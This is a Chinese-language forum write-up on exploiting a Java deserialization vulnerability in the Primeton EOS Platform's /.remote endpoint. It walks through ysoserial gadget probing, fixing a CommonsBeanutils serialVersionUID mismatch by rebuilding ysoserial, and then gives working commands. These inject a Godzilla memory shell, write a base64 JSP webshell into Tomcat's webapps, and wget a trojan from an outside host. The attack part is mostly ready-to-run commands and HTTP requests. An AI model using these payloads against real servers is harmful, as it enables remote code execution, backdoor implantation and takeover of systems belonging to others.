# 记一次普元Primeton EOS Platform反序列化漏洞的利用链报错问题调整

> **来源**: https://forum.butian.net/share/2745  
> **文章ID**: 2745

---

普元Primeton EOS Platform反序列化漏洞
=============================

一、漏洞复现探测
--------

漏洞路由/.remote

```php
10.95.209.59:8080/default/.remote
```

![](images/1678715932895-6cbfc483-ee25-449e-9fdf-b319a1e0ebaf.png)

1su18-探测反序列化利用链--选择使用全部类探测

<https://github.com/su18/ysoserial/>

![](images/1680504556753-05154519-f0c2-4835-b60c-c2927063b191.png)

坑点注意--单引号生成的大小再windows里会小了3kb导致失败

```php
正确的双引号
java -jar ysuserial-0.9-su18-all.jar -g URLDNS -p "all:gbs.dnslog.pw" >dnslog2223.ser
失败的单引号
java -jar ysuserial-0.9-su18-all.jar -g URLDNS -p 'all:gbs.dnslog.pw' >dnslog2223.ser
```

![](images/1686279213044-280cb5ec-d0d0-4253-ae2c-bedeff5c49dd.png)

```php
POST /default/.remote HTTP/1.1
Host: 10.95.209.59:8080
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/110.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/x-www-form-urlencoded
Content-Length: 0

```

![](images/1678715933505-20c2be19-005e-4005-b875-ea08a3b65eac.png)

成功dnslog

![](images/1706025739142-9a37996f-e0ad-4096-8db7-ad624b9b4605.png)

二、遇到的问题--serialVersionUID对应不上的问题
--------------------------------

没有延时并返回serialVersionUID对应不上的问题

serialVersionUID = 2573799559215537819

```php
java -jar ysoserial-for-woodpecker-0.5.2-all.jar -g CommonsBeanutils1 -a "sleep:10" >CommonsBeanutils1.ser
```

![](images/1678715935963-11165759-1a0f-4843-bf56-d76454088e50.png)

使用延时探测是否存在--可以看到报错

![](images/1686279447600-024446a5-400a-47f3-a136-5cad411eba3b.png)

三、解决问题--魔改yso
-------------

gv7探测利用链--类的列表的两篇文章

<https://gv7.me/articles/2021/construct-java-detection-class-deserialization-gadget/#6-3-CommonsBeanutils>

<https://github.com/su18/ysoserial/>

![](images/1678715934608-d44bb492-5f69-4f60-a496-6942507916b9.png)

原来的`ysoserial-for-woodpecker-0.5.2-all.jar`是cb1.9.2的

![](images/1680616783041-05d1f53d-fb13-4f5b-b9b2-0e058fba840b.png)

查阅网上资料

<https://gv7.me/articles/2021/construct-java-detection-class-deserialization-gadget/#6-3-CommonsBeanutils>

发现当CommonsBeanutils版本1.7.0 <= <= 1.8.3的时候suid为2573799559215537819正好与目标环境对得上

![](images/1678715936606-02ac35f7-ea20-48b6-af7a-da56fd5af247.png)

并通过延时探测org.apache.commons.beanutils.ConstructorUtils类是否存在

```php
java -jar ysoserial-for-woodpecker-0.5.2-all.jar -g FindClassByBomb -a "org.apache.commons.beanutils.ConstructorUtils|28" >suid.ser
```

成功延时

![](images/1678715937080-a7a99615-e01a-4e7e-99e3-304a3b48c92d.png)

![](images/1680509303908-671f09c2-dac7-4a00-9eb0-46e14b6658e4.png)

打包时报错

<https://class.imooc.com/course/qadetail/264587>

于是重新打包 ysoserial ，把依赖包 commons-beanutils修改为1.6版本对应到目标环境

![](images/1686280115451-8589dd53-4825-4437-a2e4-c5dccf62c99a.png)

<https://www.runoob.com/maven/maven-setup.html>

随便下个zip去解压填进path就可以了

**配好maven环境**就去根目录重新执行下面命令

```php
MAVEN_HOME  
D:\apache-maven-3.6.1

path
%MAVEN_HOME%\bin
```

```php
mvn clean package -DskipTests
```

![](images/1686280131109-cb7626e4-4372-4a5e-8335-dd9ffafe84ab.png)

重新使用cb1.6打包的yso延时探测

```php
java -jar ysoserial-for-woodpecker-0.5.3-all.jar -g CommonsBeanutils1 -a "sleep:10" >CommonsBeanutils1.ser
```

![](images/1706025718627-bf4dcdfe-508b-4eb5-bd48-bc48d0568ebb.png)

四、漏洞利用-注入内存马和命令执行无回显写shell
--------------------------

注入内存马

成功

```php
java -jar ysoserial-for-woodpecker-0.5.3-all.jar -g CommonsBeanutils1 -a "class_file:gslFilterMemshellLoader.class" >gsl.ser
```

![](images/1688212504442-7f009e9b-8eec-4bf8-a231-b91cfd299cc9.png)

![](images/1686279741428-08f5a792-1697-4e6a-9f5e-274f87e479d3.png)

命令执行不出网写shell-如果不会打内存马或者打不成功，那最淳朴的方法就是命令执行--linux找web路径-命令执行echo写入webshell

```php
1 || for i in `find / -type d -name WEB-INF| xargs -I {} echo {}.txt`;do echo $i >$i;done
```

`linux_cmd`

```php
java -jar ysoserial-for-woodpecker-0.5.3-all.jar -g CommonsBeanutils1 -a "linux_cmd:1 || for i in `find / -type d -name WEB-INF| xargs -I {} echo {}.txt`;do echo $i >$i;done" >cmd.ser
```

<http://10.95.209.59:8080/examples/WEB-INF.txt>

/usr/local/apache-tomcat-8.5.83/webapps/examples/WEB-INF.txt

![](images/1688212434559-d34fe95b-a7d5-458b-b8a3-0b73ec8ae855.png)

写shell

```php
java -jar ysoserial-for-woodpecker-0.5.3-all.jar -g CommonsBeanutils1 -a "linux_cmd:echo base64马子 | base64 -d >/usr/local/apache-tomcat-8.5.83/webapps/examples/gsl33.jsp" >cmd.ser
```

![](images/1680513601435-42a7015d-7c87-4913-b07e-61329b67f9f8.png)

以上都是不出网的打法，当然也可以写cron计划任务不过执行两次命令就没必要了，出网的当然可以下马子直接上线就好--这里就不写了和以上的linux\_cmd方法一样

```php
wget http://ip/马子 -O /tmp/马子
```
